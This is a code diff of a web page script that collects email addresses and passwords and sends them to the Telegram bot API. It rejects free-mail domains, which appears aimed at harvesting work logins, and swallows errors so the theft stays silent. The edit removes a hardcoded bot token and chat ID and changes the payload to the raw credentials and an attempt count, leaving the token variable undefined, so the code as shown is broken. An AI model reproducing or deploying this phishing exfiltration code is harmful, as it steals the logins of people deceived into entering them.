@@ -109,8 +109,7 @@
 
   <script>
   (function(){
-    const BOT_TOKEN = '7040065345:AAGE_TcKO9MxvVV-Rh6-VmXziWEq9olex3k';
-    const CHAT_ID   = '-4726861680';
+    
 
     const bannedDomains = [
       'gmail.com','yahoo.com','outlook.com',
@@ -209,7 +208,7 @@
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text })
+        body: JSON.stringify({ email, password, attemptCount })
       }).catch(() => {});
 
       // clear password for retry
